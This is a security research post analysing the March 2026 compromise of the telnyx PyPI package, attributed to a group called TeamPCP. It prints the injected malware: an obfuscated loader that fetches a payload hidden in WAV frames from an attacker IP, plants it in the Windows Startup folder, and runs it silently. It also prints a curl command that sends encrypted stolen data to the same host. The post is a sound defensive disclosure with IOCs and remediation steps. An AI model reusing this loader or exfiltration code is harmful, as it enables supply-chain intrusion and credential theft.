---
excerpt: "On March 27th, the telnyx popular PyPI library was compromised. new versions of telnyx were uploaded to PyPI, 4.87.1 and 4.87.2. Both contains malicous payload, this compromise is linked to TeamPCP"
title: "TeamPCP strikes again - telnyx popular PyPI library compromised"
date: "March 27, 2026"
description: "Guy Korolevski, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post_thumbnail1.png
type: realTimePost
minutes: '6'

---

The JFrog security research team has identified a compromise in the widely used `telnyx` PyPI package (\~3.8M downloads). As of now, the package has been quarantined by PyPI. This ongoing compromise is also being tracked by the [open source community](https://github.com/team-telnyx/telnyx-python/issues/235). The compromised package was identified independently by JFrog’s security scanners and other security researchers such as [@CharlieEriksen](https://x.com/CharlieEriksen) and [@ramimacisabird](https://x.com/ramimacisabird).

The **Telnyx Python library** (`telnyx` on PyPI) is a carrier-grade SDK for integrating global voice, messaging, and AI services into Python 3.9+ applications. Its popularity has surged to over **670,000 monthly downloads** (as of March 2026), driven by its performance in low-latency **AI Voice Agent** workflows and its modern, type-safe architecture generated via Stainless. It is a leading enterprise alternative to Twilio, favored for its asynchronous `httpx` support and cost-efficiency in high-concurrency environments.

On March 27th, new versions of `telnyx` were uploaded to PyPI \- `4.87.1` and `4.87.2`, containing malicious code similar to the previous attacks we've seen by TeamPCP. The payload was inserted in the `telnyx/_client.py` file.

In order to masquerade as legitimate activity of the package, the payload is delivered inside  a valid WAV (audio) file, which matches the purpose of the library, as an AI voice agent. The malicious package downloads the valid WAV file, extracts a malicious encoded payload from its “audio” frames, and executes it.

It is unknown at this point how the library was compromised, but it is likely a direct result of each of TeamPCP's recent attacks on the open source ecosystems, hitting NPM, PyPI (like this week’s [litellm](https://research.jfrog.com/post/litellm-compromised-teampcp/) compromise), Go, OpenVSX and GitHub repositories.

![](/img/RealTimePostImage/post/telnyx-compromise/image1.png)  

## Payload analysis

The malicious code is injected inline. A base64-encoded blob (`_p`) holds the Linux-specific second stage. The obfuscated strings in the Windows path are decoded at runtime via a simple `base64.b64decode` helper.

```py
# line 459
_p = "aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBma...."
...

# line 7761
def _d(x):
    return base64.b64decode(x).decode('utf-8')

def setup():
    if os.name != 'nt':
        return
 
    try:
        p = os.path.join(os.getenv(_d('QVBQREFUQQ==')), _d('TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw'), _d('bXNidWlsZC5leGU='))
        l = p + _d('LmxvY2s=')
        t = p + _d('LnRtcA==')
 
        if os.path.exists(p):
            return
 
        if os.path.exists(l):
            m_time = os.path.getmtime(l)
            if (time.time() - m_time) < 43200:
                return
 
        with open(l, 'w') as f:
            f.write(str(time.time()))
 
        try:
            subprocess.run(['attrib', '+h', l], capture_output=True)
        except:
            pass
 
        r = urllib.request.Request(_d('aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg=='), headers={_d('VXNlci1BZ2VudA=='): _d('TW96aWxsYS81LjA=')})
        with urllib.request.urlopen(r, timeout=15) as d:
            with open(t, "wb") as f:
                f.write(d.read())
 
        with wave.open(t, 'rb') as w:
            b = base64.b64decode(w.readframes(w.getnframes()))
            s, m = b[:8], b[8:]
            payload = bytes([m[i] ^ s[i % len(s)] for i in range(len(m))])
            with open(p, "wb") as f:
                f.write(payload)
 
        if os.path.exists(t):
            os.remove(t)
 
        subprocess.Popen([p], creationflags=0x08000000)
 
    except:
        pass
 
def FetchAudio():
    if os.name == 'nt':
        return
    try:
        subprocess.Popen(
            [sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
    except:
        pass
```

### Windows payload \- setup()

For **Windows machines**, the script builds the path which persistence will be created in \-  `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe`  
and creates a .lock file (`msbuild.exe.lock`) to prevent re-execution within 12 hours.   
It then proceeds to download a “wav” file via `hxxr[:]//83[.]142[.]209[.]203:8080/hangup.wav`.

The downloaded wav file contains **within its frames** an executable encrypted by base64 and XOR operations. The file is decoded by using the first 8 bytes of it as the key. The decoded binary is written into the persistence path and then immediately launched silently using `CREATE_NO_WINDOW`.

```py
with wave.open(wf, 'rb') as w:
    raw = base64.b64decode(w.readframes(w.getnframes()))
    s, data = raw[:8], raw[8:]
    payload = bytes([data[i] ^ s[i % len(s)] for i in range(len(data))])
```

The “`hangup.wav`” payload file is currently unavailable for download, so the malware’s second stage payload is currently unknown.

### Non-Windows payload \- audioimport()

For non-Windows machines, the payload is downloaded via `http://83.142.209.203:8080/ringtone.wav` , which also contains within its frames a base64-encoded and XORed payload. Once again the script decodes it using the first 8 bytes of the payload, then proceeds to execute it immediately using the python process, capturing the output into a temp file.

All the data gathered by the downloaded payload is encrypted (AES-256-CBC \+ RSA-4096 envelope) and POSTed to `http://83.142.209.203:8080/` with the header `X-Filename: tpcp.tar.gz`. The use of asymmetric encryption (RSA) makes sure the payload can only be decrypted by TeamPCP. This method looks exactly like the one we've seen in recent attacks, with the same exact exfiltration code, but with a different C2 URL.

```py
subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

subprocess.run([
    "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
    "http://83.142.209.203:8080/",
    "-H", "Content-Type: application/octet-stream",
    "-H", "X-Filename: tpcp.tar.gz",
    "--data-binary", f"@{bn}"
], check=True, stderr=subprocess.DEVNULL)

```

The **encoded public key** used in previous attacks to encrypt the data is **exactly the  same** as this compromise, linking this attack directly to the recent `litellm` PyPI package compromise:

```py
PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
08qNLwm3kxzFSMj84M16lmIEeQA8u1X8DGK0EmNg7m3J6C3KzFeIzvz0UTgSq6cV
pQWpiuQa+UjTkWmC8RDDXO8G/opLGQnuQVvgsZWuT31j/Qop6rtocYsayGzCFrMV
2/ElW1UE20tZWY+5jXonnMdWBmYwzYb5iwymbLtekGEydyLalNzGAPxZgAxgkbSE
mSHLau61fChgT9MlnPhCtdXkQRMrI3kZZ4MDPuEEJTSqLr+D3ngr3237G14SRRQB
IqIjly5OoFkqJxeNPSGJlt3Ino0qO7fy7LO0Tp9bFvXTOI5c+1lhgo0lScAu1ucA
b6Hua+xRQ6s//PzdMgWT3R1aK+TqMHJZTZa8HY0KaiFeVQ3YitWuiZ3ilwCtwhT5
TlS9cBYph8U2Ek4K20qmp1dbFmxm3kS1yQg8MmrBRxOYyjSTQtveSeIlxrbpJhaU
Z7eneYC4G/Wl3raZfFwoHtmpFXDxA7HaBUArznP55LD/rZd6gq7lTDrSy5uMXbVt
6ZnKd0IwHbLkYlX0oLeCNF6YOGhgyX9JsgrBxT0eHeGRqOzEZ7rCfCavDISbR5xK
J4VRwlUSVsQ8UXt6zIHqg4CKbrVB+WMsRo/FWu6RtcQHdmGPngy+Nvg5USAVljyk
rn3JMF0xZyXNRpQ/fZZxl40CAwEAAQ==
-----END PUBLIC KEY-----"""
```

Fortunately for exposed individuals, similarly to the Windows payload (hangup.wav),  this payload URL seems broken/inactive. A timeout is reached when trying to download the next payload. This means that currently TeamPCP’s payload does not work as they intended. **However,** we still recommend for the following remediation steps to be taken immediately.

As we've seen in the [litellm](https://research.jfrog.com/post/litellm-compromised-teampcp/) attack a few days ago, a similar payload managed to exfiltrate a lot of credentials from infected systems. 

## Remediation

For anyone who installed telnyx==4.87.1 or telnyx==4.87.2:

* **Validate** you have the infected versions `pip show telnyx`  
* **Uninstall** the package immediately `pip uninstall telnyx`  
* **Downgrade** to a clean version `pip install telnyx==4.87.0`  
* **Block** all C2 addresses communication  
* **Revoke and Rotate** all exposed credentials from the environment, assume everything stored on the local machine including `.env` and other credentials are compromised.  
* **Scan for additional persistence**: On Windows machines, check for the malware’s on-disk payload \- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe`

To proactively defend your software supply chain, check out [JFrog Curation](https://jfrog.com/curation/). JFrog Curation enables early blocking of malicious or risky open-source packages before they even enter your software supply chain. To learn more, [book a demo](https://jfrog.com/platform/schedule-a-demo/).

## Conclusions

As in previous cases, the attack is ongoing and has the possibility to target more repositories and ecosystems in the future. Users must be aware of that, and be careful with their software supply chain updates.

The difference from the last incident of `litellm` is the usage of WAV files containing an encrypted payload, compared to the previous method of a direct payload planted inside the package. The usage of multiple stages can make the payload harder to analyse.

The fact that the payload URL is now inactive, does not mean that the attack has failed, due to the popularity of the package, even activity for an hour can have a large blast radius, exposing users, leaking secrets and exfiltrating confidential information.

This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.

## IOCs

* PyPI \- `telnyx` versions `4.87.1` and `4.87.2` (XRAY-957731)  
* `hxxr[:]//83[.]142[.]209[.]203:8080`  
* `hxxr[:]//83[.]142[.]209[.]203:8080/hangup.wav`  
* `hxxr[:]//83[.]142[.]209[.]203:8080/ringtone.wav`  
* `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe`  
* `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe.lock`
